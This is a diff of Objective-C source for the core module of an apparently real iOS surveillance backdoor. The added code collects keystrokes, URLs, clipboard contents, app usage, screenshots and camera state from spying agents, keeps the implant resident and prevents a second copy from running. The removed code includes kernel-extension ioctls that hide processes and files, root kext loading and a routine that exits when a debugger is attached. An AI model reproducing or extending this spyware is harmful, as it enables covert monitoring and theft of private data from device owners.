@@ -11,7 +11,8 @@
 #import <CommonCrypto/CommonDigest.h>
 #import <sys/ioctl.h>
 #import <fcntl.h>
-#import <semaphore.h>
+#import <sys/socket.h>
+#import <sys/un.h>
 
 #import "RCSICore.h"
 #import "RCSIUtils.h"
@@ -23,30 +24,10 @@
 
 #import "NSString+ComparisonMethod.h"
 
+//#define DEBUG
 
 #define VERSION             "0.9.0"
-
-#define BDOR_DEVICE         "/dev/pfCPU"
-#define MCHOOK_MAGIC        10
-
-#define SEM_NAME            "com.apple.mdworker_executed"
 #define GLOBAL_PERMISSIONS  0666
-
-//#define DEBUG
-
-// Used for the uspace<->kspace initialization
-#define MCHOOK_INIT   _IOR( MCHOOK_MAGIC, 0, int)
-// Show kext from kextstat
-#define MCHOOK_SHOWK  _IO(  MCHOOK_MAGIC, 1)
-// Hide kext from kextstat
-#define MCHOOK_HIDEK  _IO(  MCHOOK_MAGIC, 2)
-// Hide given pid
-#define MCHOOK_HIDEP  _IO(  MCHOOK_MAGIC, 3)
-// Hide given dir/file name
-#define MCHOOK_HIDED  _IOW( MCHOOK_MAGIC, 4, char [30])
-
-//#define DEBUG
-
 
 #pragma mark -
 #pragma mark Private Interface
@@ -56,16 +37,6 @@ RCSISharedMemory  *mSharedMemoryCommand;
 RCSISharedMemory  *mSharedMemoryLogging;
 
 @interface RCSICore (hidden)
-
-//
-// Create the Advisory Lock -- Not used as of now. Leaving it for future use
-//
-- (int)_createAdvisoryLock: (NSString *)lockFile;
-
-//
-// Remove the Advisory Lock -- Not used as of now. Leaving it for future use
-//
-- (int)_removeAdvisoryLock: (NSString *)lockFile;
 
 //
 // Main core routine which will receive logs from shared memory
@@ -85,108 +56,68 @@ RCSISharedMemory  *mSharedMemoryLogging;
 
 @implementation RCSICore (hidden)
 
-- (int)_createAdvisoryLock: (NSString *)lockFile
+#define IS_HEADER_MANDATORY(x) ((x & 0xFFFF0000))
+
+- (BOOL)syncSharedMemoryLogging:(NSMutableData *)aData
 {
-  NSError *error;
-  BOOL success = [@"" writeToFile: lockFile
-                       atomically: NO
-                         encoding: NSUnicodeStringEncoding
-                            error: &error];
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  //
-  // Here we might get a privilege error in case the lock is on
-  //
-  if (success == YES)
+  RCSILogManager *_logManager = [RCSILogManager sharedInstance];
+   
+  shMemoryLog *shMemLog = (shMemoryLog *)[aData bytes];
+  
+  NSMutableData *payload;
+
+  if (shMemLog->agentID == LOG_KEYLOG)
     {
-      NSFileHandle *lockFileHandle = [NSFileHandle fileHandleForReadingAtPath:
-                                      lockFile];
-#ifdef DEBUG
-      infoLog(ME, @"Lock file created succesfully");
-#endif
-      
-      if (lockFileHandle) 
+      if (IS_HEADER_MANDATORY(shMemLog->flag))
         {
-          int fd = [lockFileHandle fileDescriptor];
-          
-          if (flock(fd, LOCK_EX | LOCK_NB) != 0)
-            {
-#ifdef DEBUG
-              errorLog(ME, @"Failed to acquire advisory lock");
-#endif
-              
-              return -1;
-            }
-          else
-            {
-#ifdef DEBUG
-              infoLog(ME, @"Advisory lock acquired correctly");
-#endif
-              
-              return fd;
-            }
+          payload = [NSMutableData dataWithBytes: shMemLog->commandData 
+                                          length: shMemLog->commandDataSize];
         }
       else
-        return -1;
-    }
-  else
-    {
-#ifdef DEBUG
-      errorLog(ME, @"%@", error);
-#endif
-    }
-  
-  return -1;
-}
-
-- (int)_removeAdvisoryLock: (NSString *)aLockFile
-{
-  NSError *error;
-  
-  if (flock([self mLockFD], LOCK_UN) != 0)
-    {
-#ifdef DEBUG
-      errorLog(ME, @"Error while removing advisory lock");
-#endif
-      
-      return -1;
-    }
-  else
-    {
-#ifdef DEBUG
-      infoLog(ME, @"Advisory lock removed correctly");
-#endif
-      
-      BOOL success = [[NSFileManager defaultManager] removeItemAtPath: aLockFile
-                                                                error: &error];
-      
-      if (success == NO)
         {
-#ifdef DEBUG
-          errorLog(ME, @"Error while deleting lock file");
-#endif
-          
-          return -1;
+          int off = (shMemLog->flag & 0x0000FFFF);
+          payload = [NSMutableData dataWithBytes: shMemLog->commandData + off 
+                                                   length: shMemLog->commandDataSize - off];
+        }
+    }
+  else
+    {
+      payload = [NSMutableData dataWithBytes: shMemLog->commandData
+                                      length: shMemLog->commandDataSize];
+    }
+    
+  if ([_logManager writeDataToLog: payload
+                         forAgent: shMemLog->agentID
+                        withLogID: shMemLog->logID] == FALSE)
+    {
+      // log streaming closed by sync: recreate and append whole log
+      if ([_logManager createLog:shMemLog->agentID 
+                     agentHeader:nil 
+                       withLogID:shMemLog->logID])
+        {
+          if (shMemLog->agentID == LOG_KEYLOG)
+            {
+              payload = [NSMutableData dataWithBytes: shMemLog->commandData
+                                              length: shMemLog->commandDataSize];
+            }
+                                                    
+          [_logManager writeDataToLog:payload 
+                             forAgent:shMemLog->agentID
+                            withLogID:shMemLog->logID];
         }
     }
   
-  return 0;
+  [pool release];
+  
+  return TRUE;
 }
 
 - (void)_communicateWithAgents
 {
-  //
-  // TODO: Implement a condition for stopping this while loop
-  // e.g. configurationUpdate / backdoorUpgrade
-  //
-  int agentIndex = 0;
-  int agentsCount = 8;
-  
   shMemoryLog *shMemLog;
   RCSILogManager *_logManager = [RCSILogManager sharedInstance];
-  
-#ifdef DEBUG
-  infoLog(ME, @"Starting core main thread");
-#endif
   
   while (mMainLoopControlFlag != @"STOP")
     {
@@ -204,178 +135,62 @@ RCSISharedMemory  *mSharedMemoryLogging;
           
           switch (shMemLog->agentID)
             {
-            case AGENT_SCREENSHOT:
+            case LOG_URL:
+            case LOG_APPLICATION:
+            case LOG_CLIPBOARD:
+            case LOG_KEYLOG:
+              {
+                [self syncSharedMemoryLogging: readData];
+                break;
+              }
+            case LOG_SNAPSHOT:
               {
                 NSMutableData *scrData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                                        length: shMemLog->commandDataSize];
-
+                
                 if (shMemLog->commandType == CM_CREATE_LOG_HEADER) 
                   {
-                    if ([_logManager createLog: LOG_SNAPSHOT
-                                   agentHeader: scrData
-                                     withLogID: shMemLog->logID] == YES)
-                      {
-#ifdef DEBUG
-                        debugLog(ME, @"%screenshot log 0x%x header create correctly [%ld %ld]", 
-                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
-#endif
-                      }
-                    else 
-                      {
-#ifdef DEBUG  
-                        errorLog(ME, @"screenshot log 0x%x header creation error [%ld %ld]", 
-                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
-#endif
-                      }
+                    [_logManager createLog: LOG_SNAPSHOT
+                               agentHeader: scrData
+                                 withLogID: shMemLog->logID];
                   }
-                else 
+                else
                   {
-                    if ([_logManager writeDataToLog: scrData
-                                           forAgent: LOG_SNAPSHOT
-                                          withLogID: shMemLog->logID] == TRUE)
-                      {
-#ifdef DEBUG
-                        debugLog(ME, @"screenshot log 0x%x logged correctly [%ld %ld]",
-                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
-#endif
-                      }
-                    else 
-                      {
-#ifdef DEBUG
-                        errorLog(ME, @"screenshot log 0x%x logging error [%ld %ld]", 
-                                 shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
-#endif
-                      }
-
+                    [self syncSharedMemoryLogging: readData];
                     if (shMemLog->commandType == CM_CLOSE_LOG) 
-                      {
-                        if ([_logManager closeActiveLog: LOG_SNAPSHOT
-                                              withLogID: shMemLog->logID] == YES)
-                          {
-#ifdef DEBUG
-                            debugLog(ME, @"screenshot log 0x%x closed correctly [%ld %ld]", 
-                                     shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
-#endif
-                          }
-                        else 
-                          {
-#ifdef DEBUG
-                            errorLog(ME, @"screenshot log 0x%x close error [%ld %ld]", 
-                                     shMemLog->logID, shMemLog->timestamp, shMemLog->timestamp);
-#endif
-                          }
-                      }
+                        [_logManager closeActiveLog: LOG_SNAPSHOT
+                                          withLogID: shMemLog->logID];
                   }
-                
+                  
                 [scrData release];
                 break;
               }  
-            case AGENT_URL:
-              {
-                //NSString *url = [[NSString alloc] initWithCString: shMemLog->commandData];
-                NSMutableData *urlData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
-                                                                       length: shMemLog->commandDataSize];
-                
-                if ([_logManager writeDataToLog: urlData
-                                       forAgent: LOG_URL
-                                      withLogID: 0] == TRUE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: URL logged correctly", __FUNCTION__);
-#endif
-                  }
-                
-                [urlData release];
-                break;
-              }
-            case AGENT_APPLICATION:
-              {
-                //NSString *url = [[NSString alloc] initWithCString: shMemLog->commandData];
-                NSMutableData *appData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
-                                                                       length: shMemLog->commandDataSize];
-                
-                if ([_logManager writeDataToLog: appData
-                                       forAgent: LOG_APPLICATION
-                                      withLogID: 0] == TRUE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: APP logged correctly", __FUNCTION__);
-#endif
-                  }
-              
-                [appData release];
-                break;
-              }
-            case AGENT_KEYLOG:
-              {
-                NSMutableData *keylogData = [NSMutableData dataWithBytes: shMemLog->commandData 
-                                                                  length: shMemLog->commandDataSize];
-                
-                if ([_logManager writeDataToLog: keylogData
-                                       forAgent: LOG_KEYLOG
-                                      withLogID: 0] == TRUE)
-                  {
-#ifdef DEBUG
-                    infoLog(ME, @"keystrokes logged correctly");
-#endif
-                  }
-                
-                break;
-              }
             case EVENT_STANDBY:
               {
-#ifdef DEBUG
-                NSLog(@"%s: Event standby triggering action %d", __FUNCTION__, shMemLog->flag);
-#endif
-                 RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
+                RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
                 
                 if (shMemLog->flag != CONF_ACTION_NULL)                   
-                  [taskManager triggerAction: shMemLog->flag];
-                
+                  [taskManager triggerAction: shMemLog->flag];                
                 break;
               }
-            case AGENT_CLIPBOARD:
-              {
-                //NSString *url = [[NSString alloc] initWithCString: shMemLog->commandData];
-                NSMutableData *clipData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
-                                                                        length: shMemLog->commandDataSize];
-                
-                if ([_logManager writeDataToLog: clipData
-                                       forAgent: LOG_CLIPBOARD
-                                      withLogID: 0] == TRUE)
-                {
-#ifdef DEBUG
-                  NSLog(@"%s: clipboard logged correctly", __FUNCTION__);
-#endif
-                }
-                
-                [clipData release];
+            case AGENT_CAM:
+              {             
+                if (shMemLog->flag == 1)
+                    gCameraActive = TRUE;
+                else if (shMemLog->flag == 2)
+                    gCameraActive = FALSE;
+             
                 break;
               }
-            default:
-              {
-#ifdef DEBUG
-                errorLog(ME, @"Agent not yet implemented suckers");
-#endif
-                
-                break;
-              }
+
           }
           
           [readData release];
         }
       
-      if (agentsCount - agentIndex == 1)
-        agentIndex = 0;
-      else
-        agentIndex++;
-      
-      // getting notification for AB stuff 
       [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.080]]; 
       
       [innerPool release];
-      
-      //usleep(80000);
     }
 }
 
@@ -568,130 +383,73 @@ RCSISharedMemory  *mSharedMemoryLogging;
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  //
-  // Check if the backdoor is already running
-  //
-  sem_t *namedSemaphore = sem_open(SEM_NAME,
-                                   O_CREAT | O_EXCL,
-                                   GLOBAL_PERMISSIONS,
-                                   1);
+  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance]; 
+  
+  // Set the backdoorControlFlag to RUNNING
+  mMainLoopControlFlag = @"RUNNING";
+  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
   
   //
-  // Get system version in global variables
+  // Lock to prevent more instance of running backdoor
   //
-  getSystemVersion(&gOSMajor,
-                   &gOSMinor,
-                   &gOSBugFix);
-
-#ifdef DEBUG
-  NSLog(@"Found iOS ver %d.%d.%d", gOSMajor, gOSMinor, gOSBugFix);
-#endif
-
-  if (namedSemaphore == SEM_FAILED)
+  if ((gLockSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1) 
     {
-      int err = errno;
+      struct sockaddr_in l_addr;   
       
-      if (err == ENOENT || err == EEXIST)
+      memset(&l_addr, 0, sizeof(l_addr));
+      l_addr.sin_family = AF_INET;
+      l_addr.sin_port = htons(37173);
+      l_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+      
+      if ((bind(gLockSock, (struct sockaddr *)&l_addr, sizeof(l_addr)) == -1) && 
+          errno == EADDRINUSE) 
         {
 #ifdef DEBUG
-          warnLog(ME, @"Trying to unlink semaphore since process was killed");
+          NSLog(@"%s: cannot bind socket, instance already running, errno %d", __FUNCTION__, errno);
 #endif
-          if (sem_unlink(SEM_NAME) == 0)
-            {
-#ifdef DEBUG
-              infoLog(ME, @"sem_unlink went ok");
-              infoLog(ME, @"Trying to recreate the semaphore");
-#endif
-              namedSemaphore = sem_open(SEM_NAME,
-                                        O_CREAT | O_EXCL,
-                                        GLOBAL_PERMISSIONS,
-                                        1);
-            
-              if (namedSemaphore == SEM_FAILED)
-                {
-#ifdef DEBUG
-                  errorLog(ME, @"An error occurred while recreating semaphore after unlink");
-#endif
-                }
-            }
-          else
-            {
-#ifdef DEBUG
-              errorLog(ME, @"An error occurred while unlinking semaphore");
-#endif
-            }
-        }
-      else
-        {
-#ifdef DEBUG
-          errorLog(ME, @"Execution check error! Backdoor is already running");
-          errorLog(ME, @"err (%d) %s", errno, strerror(errno));
-#endif
-      
+          [pool release];
           exit(-1);
         }
     }
   else
     {
 #ifdef DEBUG
-      infoLog(ME, @"Semaphore Registered correctly");
+      NSLog(@"%s: error create socket, [%d] could not check running instance", __FUNCTION__, gLockSock);
 #endif
     }
+      
+  //
+  // Get system version in global variables
+  //
+  getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);
+
+#ifdef DEBUG
+  NSLog(@"Found iOS ver %d.%d.%d", gOSMajor, gOSMinor, gOSBugFix);
+#endif
     
   //
   // Create and initialize the shared memory segments
   // for commands and logs
   //
   if ([mSharedMemoryCommand createMemoryRegion] == -1)
-    {
-#ifdef DEBUG
-      errorLog(ME, @"[CORE] There was an error while creating the Commands Shared Memory");
-#endif
-      return NO;
-    }
+    return NO;
+    
   if ([mSharedMemoryCommand attachToMemoryRegion: YES] == -1)
-    {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while attaching to the Commands Shared Memory");
-#endif
-      return NO;
-    }
+    return NO;
   
   [mSharedMemoryCommand zeroFillMemory];
   
   if ([mSharedMemoryLogging createMemoryRegion] == -1)
-    {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while creating the Logging Shared Memory");
-#endif
-      return NO;
-    }
+    return NO;
+
   if ([mSharedMemoryLogging attachToMemoryRegion: YES] == -1)
-    {
-#ifdef DEBUG
-      errorLog(ME, @"There was an error while attaching to the Logging Shared Memory");
-#endif
-      return NO;
-    }
+    return NO;
   
   [mSharedMemoryLogging zeroFillMemory];
   
-  //if ([mApplicationName isEqualToString: mBinaryName])
-    //{
-      //
-      // Check if there's another backdoor running
-      //
-    //}
-  
-  if ([self isBackdoorAlreadyResident] == YES)
+  if ([self isBackdoorAlreadyResident] == FALSE)
     {
-#ifdef DEBUG    
-      warnLog(ME, @"Backdoor has been made already resident");
-#endif  
-    }
-  else
-    {
-      if ([self makeBackdoorResident] == NO)
+      if ([self makeBackdoorResident] == FALSE)
         {
 #ifdef DEBUG
           errorLog(ME, @"[makeBackdoorResident] An error occurred");
@@ -704,52 +462,28 @@ RCSISharedMemory  *mSharedMemoryLogging;
 #endif
         }
     }
-  /* 
-  // TODO: Check if we really need to load our kext
-  [self loadKext];
   
-  if ([self connectKext] != -1)
+  // If resident configuration is invalid core exit immediately
+  if ([taskManager loadInitialConfiguration])
     {
-      // 
-      // Start hiding all the required paths
-      // launchDaemonFile
-      // appDroppedPath == Where we have been dropped which is different than our
-      // app folder (/RCSMac.app/)
-      //
-      int ret;
-      ret = ioctl(mBackdoorFD, MCHOOK_HIDED, (char *)[[launchDaemonPath 
-                                                       lastPathComponent] fileSystemRepresentation]);
-      NSString *appDroppedPath = [[[[NSBundle mainBundle] bundlePath]
-                                   stringByDeletingLastPathComponent] lastPathComponent];
-      ret = ioctl(mBackdoorFD, MCHOOK_HIDED, (char *)[appDroppedPath fileSystemRepresentation]);
-    }
-*/
-  
-  //
-  // Get a task Manager instance (singleton) and load the configuration
-  // through the confManager
-  //
-  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
-  
-  //
-  // Load the configuration and starts all the events monitoring routines
-  // eventsMonitor detached as a separate thread
-  //
 #ifdef DEBUG
-  infoLog(ME, @"Loading initial configuration");
+      NSLog(@"%s: configuration loaded and running",__FUNCTION__);
 #endif
+    }
   
-  [taskManager loadInitialConfiguration];
+  // Start enabled agents
+  [taskManager startAgents];
   
-  // Set the backdoorControlFlag to RUNNING
-  mMainLoopControlFlag = @"RUNNING";
-  taskManager.mBackdoorControlFlag = mMainLoopControlFlag;
+  // Start events monitor
+  [taskManager startEvents];
   
   RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
   [infoManager logActionWithDescription: @"Start"];
   [infoManager release];
 
+  //
   // Main backdoor loop
+  //
   [self _communicateWithAgents];
   
   [pool release];
@@ -757,111 +491,6 @@ RCSISharedMemory  *mSharedMemoryLogging;
   return YES;
 }
 
-- (void)loadKext
-{
-  // TODO: Fix chmod/chown/kextload paths
-  NSArray *arguments = [NSArray arrayWithObjects: @"-R",
-                        @"744",
-                        [mUtil mKextPath],
-                        nil];
-  [mUtil executeTask: @"/bin/chmod"
-       withArguments: arguments
-        waitUntilEnd: YES];
-  
-  arguments = [NSArray arrayWithObjects: @"-R",
-               @"root:wheel",
-               [mUtil mKextPath],
-               nil];
-  [mUtil executeTask: @"/usr/sbin/chown"
-       withArguments: arguments
-        waitUntilEnd: YES];
-  
-  arguments = [NSArray arrayWithObjects: @"-v",
-               [mUtil mKextPath],
-               nil];
-  
-  [mUtil executeTask: @"/sbin/kextload"
-       withArguments: arguments
-        waitUntilEnd: YES];
-}
-
-- (int)connectKext
-{
-#ifdef DEBUG
-  infoLog(ME, @"[connectKext] Initializing backdoor");
-#endif
-  
-  self.mBackdoorFD = open(BDOR_DEVICE, O_RDWR);
-  if (mBackdoorFD != -1) {
-    int ret, bID;
-    
-    ret = ioctl(mBackdoorFD, MCHOOK_INIT, &bID);
-    if (ret < 0)
-      {
-#ifdef DEBUG
-        errorLog(ME, @"[initBackdoor] Error while initializing the uspace-kspace"\
-                  "communication channel\n");
-#endif
-      }
-    else
-      {
-#ifdef DEBUG
-        infoLog(ME, @"[initBackdoor] Backdoor initialized correctly\n");
-#endif
-        
-        return bID;
-      }
-  }
-  else
-    {
-#ifdef DEBUG
-      errorLog(ME, @"[initBackdoor] Error while initializing backdoor");
-#endif
-    }
-  
-  return -1;
-}
-
-//
-// See http://developer.apple.com/qa/qa2004/qa1361.html
-//
-- (void)amIBeingDebugged
-{
-  while (true)
-    {
-      int                 junk;
-      int                 mib[4];
-      struct kinfo_proc   info;
-      size_t              size;
-      
-      //
-      // Initialize the flags so that, if sysctl fails for some bizarre
-      // reason, we get a predictable result.
-      //
-      info.kp_proc.p_flag = 0;
-      
-      //
-      // Initialize mib, which tells sysctl the info we want, in this case
-      // we're looking for information about a specific process ID. 
-      //
-      mib[0] = CTL_KERN;
-      mib[1] = KERN_PROC;
-      mib[2] = KERN_PROC_PID;
-      mib[3] = getpid();
-      
-      // Call sysctl
-      size = sizeof(info);
-      junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
-      assert(junk == 0);
-      
-      // We're being debugged if the P_TRACED flag is set
-      if ((info.kp_proc.p_flag & P_TRACED) != 0)
-        {
-          exit(-1);
-        }
-      
-      usleep(1000000);
-    }
-}
-
 @end
+
+
